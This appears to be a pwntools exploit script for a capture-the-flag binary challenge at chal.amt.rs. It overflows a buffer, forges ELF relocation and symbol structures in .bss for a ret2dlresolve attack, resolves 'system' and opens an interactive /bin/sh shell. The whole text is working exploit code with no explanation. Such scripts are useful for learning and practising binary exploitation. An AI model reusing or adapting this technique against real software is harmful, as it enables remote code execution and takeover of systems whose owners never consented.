#!/usr/bin/python3
from pwn import *
from elf import *

HOST = 'chal.amt.rs'
PORT = 1344

exe = ELF('./chal')

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

gs = '''
b main
c
'''

def start():
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=gs)
    elif args.REMOTE:
        return remote(HOST, PORT)  
    else:
        return process([exe.path])

addr_bss = exe.get_section_by_name('.bss').header['sh_addr']
addr_rela_plt = exe.get_section_by_name('.rela.plt').header['sh_addr']
addr_dynsym = exe.get_section_by_name('.dynsym').header['sh_addr']
addr_dynstr = exe.get_section_by_name('.dynstr').header['sh_addr']

log.info(f'addr_bss = {addr_bss : #x}')
log.info(f'addr_rela_plt = {addr_rela_plt : #x}')
log.info(f'addr_dynsym = {addr_dynsym : #x}')
log.info(f'addr_dynstr = {addr_dynstr : #x}')

addr_fake_Elf64_Rela = align(sizeof(Elf64_Rela), addr_bss + 0xd00 + 0x20)
addr_fake_Elf64_Sym = align(sizeof(Elf64_Sym), addr_fake_Elf64_Rela + sizeof(Elf64_Sym))
addr_fake_str = addr_fake_Elf64_Sym + sizeof(Elf64_Sym)

fake_Elf64_Rela = Elf64_Rela()
fake_Elf64_Rela.r_offset = exe.got['gets']
fake_Elf64_Rela.r_sym = int((addr_fake_Elf64_Sym - addr_dynsym) / sizeof(Elf64_Sym))
fake_Elf64_Rela.r_type = 7
log.info(f'addr_fake_Elf64_Rela = {addr_fake_Elf64_Rela : #x}')
dump(fake_Elf64_Rela)

fake_Elf64_Sym = Elf64_Sym()
fake_Elf64_Sym.st_name = (addr_fake_str - addr_dynstr)
fake_Elf64_Sym.st_other = 0
log.info(f'addr_fake_Elf64_Sym = {addr_fake_Elf64_Sym : #x}')
dump(fake_Elf64_Sym)

log.info(f'addr_fake_str = {addr_fake_str : #x}')

fake_idx = int((addr_fake_Elf64_Rela - addr_rela_plt) / sizeof(Elf64_Rela))
log.info(f'fake_idx = {fake_idx : #x}')

io = start()

payload = b'a' * 0xd + pack(addr_bss + 0xd00) + pack(0x40112e)
io.sendline(payload)

# call gets(&_IO_stdfile_0_lock) and system("/bin/sh")
payload = b'\0' * 0xd + pack(0) + pack(exe.plt['gets']) + \
          pack(0x401020) + pack(fake_idx) + \
          b'\0' * (addr_fake_Elf64_Rela - (addr_bss + 0xd00 + 0x20)) + \
          bytes(fake_Elf64_Rela) + \
          bytes(fake_Elf64_Sym) + \
          b'system\0'

io.sendline(payload)

io.sendline(b'/bin0sh\0')
io.interactive()